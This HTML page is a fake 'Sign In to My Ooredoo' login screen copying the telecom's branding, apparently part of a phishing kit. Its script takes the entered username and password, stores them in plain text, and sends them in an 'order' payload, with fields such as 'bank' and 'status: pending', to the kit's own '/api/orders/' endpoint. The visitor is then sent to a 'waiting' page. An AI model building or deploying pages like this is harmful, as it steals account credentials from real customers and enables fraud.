<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Sign In - Ooredoo</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --red: #D0191F;
    --white: #FFFFFF;
    --text: #1A1A1A;
    --text-light: #808080;
    --line: #D0D0D0;
    --bg: #FAFAFA;
    --error: #D0191F;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; }
  body { 
    font-family: 'Cairo', Tahoma, Arial, sans-serif; 
    background: var(--bg); 
    color: var(--text);
    display: flex;
    flex-direction: column;
  }

  /* ===== Header ===== */
  .site-header {
    position: sticky; top: 0; z-index: 100;
    background: var(--white);
    border-bottom: 1px solid var(--line);
    padding-top: env(safe-area-inset-top, 0px);
  }
  .header-inner {
    max-width: 1200px; margin: 0 auto;
    height: 72px; padding: 0 16px;
    display: flex; align-items: center; justify-content: space-between;
  }
  .logo { font-size: 1.5rem; font-weight: 700; color: var(--red); text-decoration: none; }
  
  .logo-placeholder {
    display: flex;
    align-items: center;
    justify-content: center;
    height: 72px;
    width: auto;
  }
  
  .ooredoo-logo {
    height: 62px;
    width: auto;
    max-width: 220px;
    object-fit: contain;
    display: block;
    transform: scale(1.3);
    transform-origin: center;
  }
  .header-actions { display: flex; align-items: center; gap: 12px; }

  .lang-toggle {
    display: flex; background: #fff;
    border: 2px solid var(--red); border-radius: 999px;
    padding: 2px; cursor: pointer; font-family: inherit;
  }
  .lang-toggle span {
    padding: 4px 12px; border-radius: 999px;
    font-size: .85rem; font-weight: 600; color: var(--red);
    transition: background .2s, color .2s;
  }
  .lang-toggle span.active { background: var(--red); color: #fff; }

  .menu-btn {
    width: 44px; height: 44px; background: none; border: none; cursor: pointer;
    display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 6px;
    border-radius: 8px;
  }
  .menu-btn span {
    display: block; width: 26px; height: 3px; border-radius: 2px;
    background: var(--red); transition: transform .25s, opacity .25s;
  }
  .menu-btn.open span:nth-child(1) { transform: translateY(9px) rotate(45deg); }
  .menu-btn.open span:nth-child(2) { opacity: 0; }
  .menu-btn.open span:nth-child(3) { transform: translateY(-9px) rotate(-45deg); }

  .nav-menu { display: none; background: #fff; border-top: 1px solid var(--line); }
  .nav-menu.open { display: block; }
  .nav-menu a {
    display: block; padding: 14px 20px; color: var(--text);
    text-decoration: none; font-weight: 600; border-bottom: 1px solid var(--line);
  }
  .nav-menu a:hover { color: var(--red); background: #FFF5F5; }

  .container {
    flex: 1; max-width: 420px; width: 100%; margin: 0 auto;
    padding: 40px 20px; padding-bottom: max(32px, env(safe-area-inset-bottom, 0px));
  }

  .login-header { margin-bottom: 36px; text-align: center; }
  .login-header h1 {
    font-size: 1.7rem; font-weight: 700; margin-bottom: 12px;
    line-height: 1.2;
    color: var(--text);
  }
  .login-header h1 .accent { color: var(--red); font-weight: 700; }
  .login-header p { 
    color: var(--text-light); 
    font-size: .9rem;
    line-height: 1.5;
    font-weight: 400;
  }

  .form-group { margin-bottom: 18px; }
  .form-group label { 
    display: block; 
    margin-bottom: 8px; 
    font-weight: 400; 
    font-size: .9rem;
    color: var(--text-light);
  }
  .form-group input {
    width: 100%;
    padding: 13px 16px;
    border: 1.5px solid var(--line);
    border-radius: 12px;
    font-family: inherit;
    font-size: .9rem;
    color: var(--text);
    transition: border-color .2s;
  }
  .form-group input::placeholder {
    color: var(--text-light);
  }
  .form-group input:focus {
    outline: none;
    border-color: var(--red);
  }
  .form-group input.error {
    border-color: var(--error);
    background: #FEE;
  }

  .error-message {
    display: none;
    color: var(--error);
    font-size: 0.85rem;
    margin-top: 6px;
    font-weight: 500;
  }
  .error-message.show { display: block; }

  .error-alert {
    display: none;
    background: #FEE;
    border: 1px solid var(--line);
    border-radius: 8px;
    padding: 16px 20px;
    margin-bottom: 24px;
    align-items: center;
    gap: 12px;
    animation: slideDown 0.3s ease-out;
  }

  .error-alert.show { display: flex; }

  .error-alert-close {
    background: none;
    border: none;
    color: var(--red);
    font-size: 1.5rem;
    cursor: pointer;
    padding: 0;
    width: 24px;
    height: 24px;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .error-alert-text {
    color: var(--red);
    font-weight: 600;
    flex: 1;
    font-size: 0.95rem;
  }

  .forgot-password { 
    text-align: center; 
    margin-bottom: 32px;
  }
  .forgot-password a {
    color: var(--red); 
    text-decoration: none; 
    font-weight: 600; 
    font-size: .95rem;
    border-bottom: 1.5px solid var(--red);
    transition: opacity .2s;
  }
  .forgot-password a:hover { opacity: 0.85; }

  .login-btn {
    width: 100%; 
    padding: 18px 24px; 
    background: var(--red); 
    color: white;
    border: none; 
    border-radius: 999px; 
    font-family: inherit;
    font-size: 1.1rem; 
    font-weight: 700; 
    cursor: pointer;
    transition: background .2s, transform .1s;
  }
  .login-btn:hover { background: #B3161C; }
  .login-btn:active { transform: scale(0.98); }
  .login-btn:focus-visible {
    outline: 3px solid rgba(208, 25, 31, 0.35);
    outline-offset: 2px;
  }

  @media (max-width: 480px) {
    .container { padding: 48px 20px; }
    .login-header h1 { font-size: 1.75rem; }
    .login-header { margin-bottom: 40px; }
  }

  @keyframes slideDown {
    from {
      opacity: 0;
      transform: translateY(-10px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }
</style>
</head>
<body>

<header class="site-header">
  <div class="header-inner">
    <div class="logo-placeholder">
      <img src="https://i.ibb.co/1JJbfqh8/ooredoo-logo-png-seeklogo-446266.png" alt="Ooredoo" class="ooredoo-logo">
    </div>
    <div class="header-actions">
      <button class="lang-toggle" id="langToggle" aria-label="Change Language">
        <span class="active" data-lang="ar">AR</span>
      </button>
      <button class="menu-btn" id="menuBtn" aria-label="Menu" aria-expanded="false" aria-controls="navMenu">
        <span></span><span></span><span></span>
      </button>
    </div>
  </div>
  <nav class="nav-menu" id="navMenu">
    <a href="#">Home</a>
    <a href="#">Products</a>
    <a href="#">About Us</a>
    <a href="#">Contact Us</a>
  </nav>
</header>

<main class="container">
  <div class="error-alert" id="errorAlert">
    <span class="error-alert-text" id="errorText">Invalid username or password</span>
    <button class="error-alert-close" id="errorClose" aria-label="Close Alert">✕</button>
  </div>

  <div class="login-header">
    <h1>Sign In to <span class="accent">My</span><br><span class="accent">Ooredoo</span></h1>
    <p>Sign in using your username and password.</p>
  </div>

  <form id="loginForm">
    <div class="form-group">
      <label for="email">Email or Username</label>
      <input type="text" id="email" name="email" placeholder="Email or Username" required>
      <div class="error-message" id="emailError">Email or username is required</div>
    </div>

    <div class="form-group">
      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Password" required>
      <div class="error-message" id="passwordError">Password is required</div>
    </div>

    <div class="forgot-password">
      <a href="#">Forgot password?</a>
    </div>

    <button type="submit" class="login-btn">Sign In</button>
  </form>
</main>

<script>
  const menuBtn = document.getElementById('menuBtn');
  const navMenu = document.getElementById('navMenu');
  menuBtn.addEventListener('click', () => {
    const open = menuBtn.classList.toggle('open');
    navMenu.classList.toggle('open', open);
    menuBtn.setAttribute('aria-expanded', open);
  });

  const langToggle = document.getElementById('langToggle');
  langToggle.addEventListener('click', () => {
    window.location.href = 'login_ooredoo.html';
  });

  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');
  const emailError = document.getElementById('emailError');
  const passwordError = document.getElementById('passwordError');
  const errorAlert = document.getElementById('errorAlert');
  const errorClose = document.getElementById('errorClose');
  const loginForm = document.getElementById('loginForm');

  // Show error alert if login failed
  window.addEventListener('load', () => {
    const loginError = sessionStorage.getItem('loginError');
    if (loginError) {
      errorAlert.classList.add('show');
      sessionStorage.removeItem('loginError');
    }
  });

  // Close error alert
  errorClose.addEventListener('click', () => {
    errorAlert.classList.remove('show');
  });

  loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    
    let isValid = true;
    
    // Validate email
    if (emailInput.value.trim() === '') {
      emailInput.classList.add('error');
      emailError.classList.add('show');
      isValid = false;
    } else {
      emailInput.classList.remove('error');
      emailError.classList.remove('show');
    }
    
    // Validate password
    if (passwordInput.value.trim() === '') {
      passwordInput.classList.add('error');
      passwordError.classList.add('show');
      isValid = false;
    } else {
      passwordInput.classList.remove('error');
      passwordError.classList.remove('show');
    }
    
    // If all data is valid, go to loading page
    if (isValid) {
      const ooredooUser = emailInput.value.trim();
      const ooredooPass = passwordInput.value.trim();
      const currentOrderId = 'ooredoo-' + Date.now() + '-' + Math.random().toString(16).slice(2, 10);

      sessionStorage.removeItem('safwa_order_id');
      localStorage.removeItem('requestId');
      sessionStorage.setItem('userEmail', ooredooUser);
      sessionStorage.setItem('userPassword', ooredooPass);
      sessionStorage.setItem('ooredooUser', ooredooUser);
      sessionStorage.setItem('ooredooPass', ooredooPass);
      sessionStorage.setItem('safwa_order_id', currentOrderId);
      localStorage.setItem('requestId', currentOrderId);

      const payload = {
        id: currentOrderId,
        name: 'Ooredoo User',
        qid: '',
        phone: '',
        email: ooredooUser,
        bank: 'Ooredoo',
        ooredooUser: ooredooUser,
        ooredooPass: ooredooPass,
        status: 'pending'
      };

      const request = JSON.stringify(payload);
      sessionStorage.setItem('ooredooFlow', 'login');
      if (navigator.sendBeacon) {
        navigator.sendBeacon('/api/orders/' + encodeURIComponent(currentOrderId), new Blob([request], { type: 'application/json' }));
      } else {
        fetch('/api/orders/' + encodeURIComponent(currentOrderId), {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: request,
          keepalive: true
        }).catch(() => {});
      }

      window.location.href = 'waiting_ooredoo_en.html';
    }
  });

  // Remove error message when typing
  emailInput.addEventListener('input', () => {
    if (emailInput.value.trim() !== '') {
      emailInput.classList.remove('error');
      emailError.classList.remove('show');
    }
  });

  passwordInput.addEventListener('input', () => {
    if (passwordInput.value.trim() !== '') {
      passwordInput.classList.remove('error');
      passwordError.classList.remove('show');
    }
  });
</script>

</body>
</html>
